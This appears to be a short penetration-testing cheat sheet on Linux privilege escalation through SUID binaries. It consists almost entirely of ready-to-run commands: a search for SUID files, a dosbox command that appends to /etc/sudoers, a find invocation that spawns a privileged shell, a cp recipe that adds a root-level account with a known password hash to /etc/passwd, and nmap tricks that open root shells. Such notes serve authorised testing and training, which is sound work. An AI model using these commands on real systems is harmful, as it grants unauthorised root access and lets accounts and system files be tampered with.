---
description: Using programs which has SUID bit to root shell.
---

# SUID

```
find / -perm -u=s -type f 2>/dev/null
```

{% embed url="https://gtfobins.github.io" %}

### dosbox

```
$ dosbox -c 'mount c /etc' -c 'echo test ALL=(ALL) ALL >> C:\sudoers' -c exit
```

### find

```
find . -exec /bin/sh -p \; -quit
```

### cp&#x20;

[https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)&#x20;

```
$ openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1

$ mkdir /tmp/privesc && cd /tmp/privesc
$ cp /etc/passwd .
$ cp passwd passwd.bak

$ echo "ch:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> ./passwd
$ cp ./passwd /etc/passwd

$ su ch
password: pass123

# Restoring the original
$ cp /tmp/privesc/passwd /etc/passwd && rm -rf /tmp/privesc
```

### nmap

```
$ nmap --interactive
nmap> !sh

-----------------------

$ TF=$(mktemp)
$ echo 'os.execute("/bin/bash")' > $TF
$ nmap --script=$TF

-----------------------

$ echo 'os.execute("/bin/sh")' > /tmp/x.nse
$ nmap --script /tmp/x.nse
```
